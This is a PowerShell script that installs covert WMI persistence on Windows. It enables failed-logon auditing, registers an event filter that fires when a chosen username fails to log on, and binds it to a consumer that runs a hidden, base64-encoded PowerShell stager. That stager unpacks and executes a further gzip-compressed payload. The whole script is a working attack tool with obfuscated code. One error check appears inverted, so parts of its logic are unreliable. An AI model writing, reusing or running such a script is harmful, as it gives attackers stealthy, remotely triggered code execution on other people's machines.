# ----- Enable monitoring of failed Logon attempts (to log Event ID 4625, which will be our payload trigger) -----
auditpol.exe /set /subcategory:Logon /failure:Enable

# ----- Create the Filter, Consumer, and Binding to install the persistence -----
$username = $args[0]
if (!$username) {
    Write-Host "[!] Please supply the args[0] parameter"
    Exit
}

$FilterArgs = @{name='AuthQuery';
		        EventNameSpace='root\CimV2';
		        QueryLanguage="WQL";
		        Query="SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '4625' AND TargetInstance.Message LIKE '%$username%'";
               }
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
if (!$Filter) {
    Write-Host "[!] Filter error"
    Exit
}

$payload = "aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAE4ASQB4AGoAMgBBAEMAQQA3AFYAVwBiAFcAKwBiAFMAQgBEACsAbgBFAGoANQBEADYAaQB5AEIAQwBpAE8AdwBhAG0AYgBwAHAARQBxAEgAZABqAFkAeABqAFcASgBDAFQAWgArAHEAMwBYAEMAcwBNAEQAVwBDADcAaQB3AHgAQwBhADkALwB2AGUAYgB0AFMARgBOADEAZgBTAHUAUABlAG0AUQBKAGUAKwB5ADgALwByAE0ATQB6AHYANABlAGUAeABTAG4ATQBTAGMAZAArAGwAegBYADgANQBPAFQAMABaAE8ANgBrAFMAYwBVAEUATgAvAG0AdgBlAG8AegB0AFgAOABlAEIAMQAxAHgASgBNAFQATwBLAHAARgAvAHIAdAA3AGsAMwB2AFAAQwBVAHQAbAB1ACsAMABrAGsAWQBQAGoAMQBjADEATgBPADAAOQBUAEYATgBQAGoAdgB0AEYARABWAE0AawB5AEYASwAwAEoAUgBwAGsAZwBjAG4AOQB4ADAAeABDAGwANgBPAEoAdQAvAFEAbQA1AGwAUAB2AEMAMQBmADUAcwA5AEUAaQB5AGQAawBnAHAAVgByAFEAZABOADAAVABjAGgAUgBKADcANwBHAHkAWQB1AEEANABMAHEARwBGAHQAQwBhAFkAQwAvAC8ARQBqAEwAeQA0AHYAbQBxAHUARwA5AGoAbAAzAFMAQwBiAHcAVgBwAEYAUgBGAEQAVQA4AFEAbgBpAFIAKwB5AG8AeQBoACsATgBpAGkAdwBUAGUAdwBHADYAYQBaAEkAbABQAEcAMQBNAGMAdgA3ADUAcwBUAE8ATABNADgAZABFAHQAVwBIAHQAQQBCAHEASgBoADQAbQBXADgAQwBHAG4AQQBMADAAVQAwAFQAMgBQAHUAbQBCAEMAegBjAEQAdwBYAGUARgBpAE8AMABzAFIAVgBQAEMAOQBGAFcAYwBiAFgAdQBTAFcAegB2AFYAeQB0AC8AaABDAFcAcABlAFAANwBQAEsAWQA0AFEAZwAwADkAcABpAGgATgB0AGgAWgBLAEgANwBDAEwAcwBrAGIAZgBpAFQAMgBDADcAcABHAC8AQQBpADIATABwAGoAZwBPAFYAcQBJAEkAWQBnAC8ASgBCAGcAbQAxAE8AQwBlAGsAegB2ADIATwBHAGUARQBXADcAUwByAFkAZgBsAFYASgBlAEsANABFAFUAaQBPAGEAaQBuAFcAbwA1AGsAdQBKAEcAbwBtAFgARQAzAFIAVQA1AFYAKwBJADkARQBnAEIARQBaADQAbgBHAGcAQgA4AFgAOAA5AE8AegAwADcAOQBpAGoAVgByAHkAOAB5AGYAMAB3AFoAVwBKADgAdgBEAEcAawBHAEUAdwBpAGoASgA4AEUASAB1AFAAUwBmAFgATwBRAE4AYwBPAFQAUgBKAEMAOQBqAFcAeABtAG0ATwB4AE4AVQBUAHYAbABDAEwAZgBmADMAbgAyAHMAMQBLAEYAQQBTAHoATgB1AFAAZwAwAGsANgB3AHQAdwBLAE4AcwBxAFEAMQBHAG8AMAAvAHQAOQBqAEIAegA3AG4AWgBRAFQANgBPAFUAYQBlAEkAbgBRAGkANwBGAGYAMgBFAGwAMwBCAEcAUABrAEcASABEAEIAdQBWADIAQwAwAEUASgBmAEQAbABBAGYASQA2AGkASwBEAEEAbwBRAHcANABWAHUANABmADEATABRAEkAMAB5AGQAZABOAGMAZgBFAFEANgBuAGkAUQBxADAAeQBpAEEAcgBLAEsASAA0AGYAegBMAEUAVwBBAHEALwBIAEIAbwBvAEEAbwBlAE8AZQBaADgAQQBEADYAVgBFAGwAWABSAEsAOQBxAEwAeQB6AFAAUQBqAHgAYgBlAEoAawBXAFoAMABiADUAZABCADEAYgBwADIAegBrAEUATwBRAFYAKwBlAFUATwBNAFAAbABrAFoATABUADUATABEAGsAdgA0AFYAcgA1AEkAUgBpADEAOABsAG8AWgBXADQAbABQAGcARgBaAE8AbQB3AG4AYwBVAGIAVAAzAEkAVwBxAFEAZgBKAGoAYQA0AHQAYwA3AEIAQwBHAFIAWgAzAHIAWQB3ACsAcABoAFkAVwBEAHkAagBIAC8ASQBoAEoAdABoAHgARABvAEIAYgBEADAAQQBKAFcAQQBOAHcAdwBCAGkAegBJAHUAcABCAEEAagAxAEYAMQBzAFcASQBqAHEAMABaAGEAZwBDAEMAUQBPADMAZAA4AGwAVABnAEMAOQBYAHYATAA5AFEAQgAwAG4AUQBCADcALwBRADQAQQBWAG4ANAAvAGsAWgBWAGgAVQBJAEQAdwBMAEQAdwBwAHMAawBZAFQAVwBPAFIAdQBuAEYARwA0AFIAaABpAHUAdwA2AEwAOAA0AGYAMwBaADUASABNAE4AbwBwADYAZwBzAGgARgBCADEAeAAxAEkAdABLAE8ATgAwAEwAVQAwAC8AeQBJAHkAUgBKAFMAZwBIAEMARgBJAEsANgBYAGYAVABKAEYASwBkAEQARgAyADEAagBoAGUARgA4AEUAcgBTAGMATwBmAE4AcQBKAE0AOABLAHYAQgBvADMAWAB2AFQAVgBpADIAcgAwADcAYwBtAFUAMQB2AEgAegBVAEYAZwA2AGQAVABxAGEAWABnADQAdwBlAG8AVQAxAHMAVgBFAGsALwBmAEYASgBCAGgAUgBlAGYAcwBCADUASgBTADAAcwB3ADkAOQBSAGMAOQAwAHIAYQA4AFcAWgBsAE4AVgAzAEQANQArAGEAdwAvAFUAeQBZAFQAcAB0AEkAZgBtAHAANwAyAHUAZQBHAG8AVQB6AEkASgA1AGUANgBlAFAAdwBwAGsATwBqAHQAcgBEAFEAQQAvAGcAWAA5AFYARABWADUAVQBYAGMAcQBEAEsAWABWAFgARABzAGgASgBZAFoAdAAvAEUAYwBqAEIAdgBOAFIAZQAzAGgAawB0ADAANgBaAHEAbwArAE4ASABTAEwAYQBVAC8AUABmAGgANwA4AHEATwAxAFcAdgAzAFoAZgBxAHoAYwBHAGcATQBsADcATgA1ADUAMwBlAFoAbABOADIAUQAyAE4AcwB6AEcAWQB0AE0AYgBkAHIAVABEADMAbQBWADcAYwA1ADUAcABXAE8AdgBPAFQAVAB0AEUAMAB3AG4AegB0ADEAVwBuAFcAbgBkAGgAMgBsAHMAOQBPAE4AOABGAHAAagAyAFUAVwB0ADEAUQBuAGMASQBlADcANABkAGIAUwA0AEsAbgAyAFIAdwA4AHgATgA2AGoAUQBhADQAZgBEAFEAagBYAHQAQgBjAEQAagBCAFoANgBnAEkAcABBAE0AUgBYAEYAbQBzAGYARQBXAHUALwBhAHkAbAAxAGcAcAA2AHAAaABxAHAAdgB1AEIATgA1AHQAeABuAHEAOABOADkAZABiAHcAeQB2AG0AZgBlAG0AZABiAFcAQwAwAFQAUgBSAFQAVQA1AFEAdQBnAFkANgBNAEYARwBmAFgAawBaAHIAVAA1AEkATgBwAHYAegBHAFAAZQBNAHIANwBuAGYAWgBKADIAbQBsADQAcwBOAHUAVQAvADUAUABlADEAVgBVAGcAKwBhADIAUgBaAEYAdAA2ADMASABkAEMARgBlAEkAdABCAHEAMABOAEgAcAB6AEQAVwBlAFQAWQA4AHQAeQBYAGIASQBaAGYAZQB4AE4ATABqAC8ARwBNAFgAQQAyAE0AQQA2AGEAUQBqAHcAawA2AGUARAB6AHUARAA1AHoAZwBIAHYAUwBPAE8AZwBxAE4AOQBaAGsAawAyAFkARQBVAEsARAA2AHgAOQBlAEQAYQBEAEcAWgBKAGYATwBsAHMAdwBQAFkAMABVAEMAQgBDAHkARABIAFUAcwBUAC8AUQBBAFgAcwAxAEoAMwBnAHoATwBaADkASgB6AFEAbgBFAEkAMABlAEQAdgBjAHgAaQBqAFEAYgBYAFkATwA5AHkAOAA0AEoATgBLAHcAUgA4AHYAWQBXAGoAcQBDAHcATwBkAGQAcABMAGwATwBtAG0AZAA5AFUAdQByAGsAYwBHADUARwBFADMAdwBXAFoAcwA1ACsATgBwAEgAMgB4AEMAegBQAG4AbQBtAHMARQBNAHQAZQAxAFkANwBiAGgAbgA2AGIATgBMAGIAMwAyAHYAUwB1AGYAZQAzAEEAbgBVAGgAZQBYADYANwBlAHYAaABGAE4AcwBQAGsAdgAyAEsATgBRAEYAMABRAFkAMwA0AEQAMgA3ADQAagBOAHcALwBHADAAMgBHAGsAMgBhAGgAUQA0AEQAMABNAEgASwBxAGkANgBhAGIAcABOADEAeQBoAEkAdwBTAHoARABRAEUAZwBYADIAQQBiAEYAQQBhAEkAdwBLAHoARwA2AFoANwAxAGEAdwBLAEkAWQBuAEwAaAB0AGgAaAAxAHMAQQBBAFAAWQA0ADEATgBtAFUAbgBzAEgAeAA5ACsAZQBKAEsANQBKADQARQB4AFcAKwB6AHIAWABwADEAYwA3AE8AQQBJAEsASAAvAFcAWQBjADIAaABpAGcATwBhAEYAaQBYADkANgA5AGwARwBjAGEAVQB2AEcALwBKAGsATwBXAHYASgA5AFoATwB0AG8AVgB3AE0ARgBWAG4AWQArADQASQBUAFcAVwBjAEgASQB5AEwANwBGADYAbwBmAFcANABGAHgAdAB2AC8ARgBiAFAAeQBOAGcAcgBoAHoALwBzADMAegBMADYAOQArADQAZgBUAFgAOABKAFIAcgBwAGMANQAvAC8ARAArACsAeABlAC8AaABlAHIAdgBwAGoANQAxAE0AQQBWAEIAQwA2ADUAVABnAG8ANwBqAC8ARwBVAEUAUwBvAEkAOAArACsASQA1ADEAQQBYAHEANwA1AGMAUAArADIAcQA5AHkAKwBuAEYATABYAHcASgBuAFoAMwArAEQAVQB5AHAAUgBQAHMAagBDAHcAQQBBACcAJwApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADsAJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAPQAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1AGUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEgAaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA=="
$ConsumerArgs = @{name='AuthQuery';
		          CommandLineTemplate="powershell.exe -nop -w hidden -e $payload";
                 }
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
if ($Consumer) {
    Write-Host "[!] Consumer error"
    Exit
}

$FilterToConsumerArgs = @{Filter = [Ref] $Filter;
			              Consumer = [Ref] $Consumer;
			             }
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
if (!$FilterToConsumerBinding) {
    Write-Host "[!] Creation failed"
    Exit
}

Write-Host "[+] Done!"